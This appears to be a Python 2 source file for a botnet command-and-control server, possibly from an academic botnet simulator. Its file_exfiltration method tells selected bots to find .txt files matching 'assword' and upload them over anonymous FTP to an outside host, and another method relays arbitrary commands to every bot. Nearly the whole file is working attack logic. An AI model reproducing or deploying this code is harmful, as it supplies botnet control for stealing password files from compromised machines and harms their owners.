#!/usr/bin/env python
# ServerCommand
import core
import copy

server_desc = {
        'initial' : 'waiting',
        'start_action' : 'initialize',
        'srv_addr':'127.0.0.1',
        'srv_port':3333,
        'request_timeout':10,
        'ftp':{
            'host':'thales.bu.edu',
            'user':'anonymous',
            'password':'',
            },
        'file_filter':{
            'suffix':['.txt'],
            'pattern':'assword',
            }
        }

import copy
class ServerCMD(core.ServerCMD):
    def __init__(self, desc=server_desc):
        core.ServerCMD.__init__(self, desc)

    def forward_to_bots(self, sock, data):
        self.logger.info('start to echo_bots' )
        new_data = copy.deepcopy(data)
        new_data['event'] = data['bot_event']
        del new_data['bot_event']
        for client_sock in self.node.client_socks:
            self.node.send(client_sock, self._dump_json(new_data))

    def file_exfiltration(self, sock, data):
        """
        command:
        """
        self.logger.info('start to issue file exfiltration command')
        print 'file_exfiltration data, ', data
        bots = data.get('bots', None)
        sock_num = len(self.node.client_socks)
        if bots:
            attack_socks = [self.node.client_socks[i] for i in xrange(sock_num) if i in bots]
        else:
            attack_socks = self.node.client_socks

        # for client_sock in self.node.client_socks:
        cmd = copy.deepcopy(self.desc['ftp'])
        cmd['event'] = 'set_ftp_info'
        for client_sock in attack_socks:
            self.node.send(client_sock, self._dump_json(cmd))

        cmd = copy.deepcopy(self.desc['file_filter'])
        cmd['event'] = 'set_file_filter'
        for client_sock in attack_socks:
            self.node.send(client_sock, self._dump_json(cmd))


